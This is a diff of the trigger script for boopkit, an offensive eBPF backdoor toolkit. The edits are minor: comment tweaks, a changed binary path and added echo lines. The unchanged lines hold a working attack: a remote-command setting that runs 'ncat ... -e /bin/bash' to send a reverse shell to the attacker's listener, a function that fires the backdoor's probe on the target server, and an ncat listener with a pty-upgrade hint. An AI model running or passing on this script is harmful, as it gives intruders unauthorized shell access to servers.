@@ -19,10 +19,10 @@
 # ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
 # ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
 # ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
-#
+
 # [Remote address]
 #
-# This is the remote (public) address of
+# This is the boopscript (public) address of
 # the server running boopkit.
 RHOST="127.0.0.1"
 RPORT="22"
@@ -44,7 +44,6 @@ NCAT="/usr/bin/ncat"
 # protocol on 3535 we need a 2nd port to listen against.
 NCATLISTENPORT="3545"
 
-
 # Remote Command Execution
 #
 # The command to run on the server!
@@ -55,7 +54,7 @@ RCE="ncat ${LHOST} ${NCATLISTENPORT} -e /bin/bash &"
 # Trigger is used to fire the eBPF probe on the server.
 trigger(){
     sleep 1
-    ./boopkit-boop \
+    boopkit-boop \
       -lhost $LHOST \
       -lport $LPORT \
       -rhost $RHOST \
@@ -76,5 +75,7 @@ trigger &
 #
 # Note: this is only required if you are performing
 # a reverse shell!
+echo ""
 echo "python -c \"import pty; pty.spawn('/bin/bash')\""
+echo ""
 ${NCAT} -lvp ${NCATLISTENPORT}
